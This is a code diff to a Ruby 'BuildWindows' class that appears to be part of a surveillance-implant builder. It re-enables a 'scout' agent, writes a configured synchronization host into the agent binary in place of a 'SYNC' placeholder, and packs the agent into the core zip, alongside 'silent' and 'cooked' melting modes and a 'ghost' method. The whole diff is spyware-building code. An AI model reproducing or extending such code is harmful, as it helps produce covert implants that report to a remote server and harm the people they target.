@@ -37,20 +37,23 @@ class BuildWindows < Build
 
     if File.exist? path('scout')
       params[:core] = 'scout'
+      params[:config] = nil
       # invoke the generic patch method with the new params
       super
-
       patch_file(:file => 'scout') do |content|
         begin
           config = JSON.parse(@factory.configs.first.config)
+          host = ""
           # search for the first sync action and take the sync address
           config['actions'].each do |action|
             action['subactions'].each do |sub|
               if sub['action'] == 'synchronize'
-                content.binary_patch 'SYNC'*16, sub['host'].ljust(64, "\x00")
+                host = sub['host'].ljust(64, "\x00")
+                break
               end
             end
           end
+          content.binary_patch 'SYNC'*16, host
         rescue
           raise "Sync marker not found"
         end
@@ -160,9 +163,6 @@ class BuildWindows < Build
     @codec = (params['codec'] == false) ? false : true
     @scout = (params['scout'] == false) ? false : true
 
-    #TODO: remove this
-    @scout = false
-
     # choose the correct melting mode
     melting_mode = :silent
     melting_mode = :cooked if @cooked
@@ -213,11 +213,16 @@ class BuildWindows < Build
       core_content = z.file.open('core', "rb") { |f| f.read }
       add_magic(core_content)
       File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
+      core_content = z.file.open('scout', "rb") { |f| f.read }
+      add_magic(core_content)
+      File.open(Config.instance.temp('scout'), "wb") {|f| f.write core_content}
     end
 
     # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
     CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
     FileUtils.rm_rf Config.instance.temp('core')
+    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('scout')}"
+    FileUtils.rm_rf Config.instance.temp('scout')
   end
 
   def ghost(params)
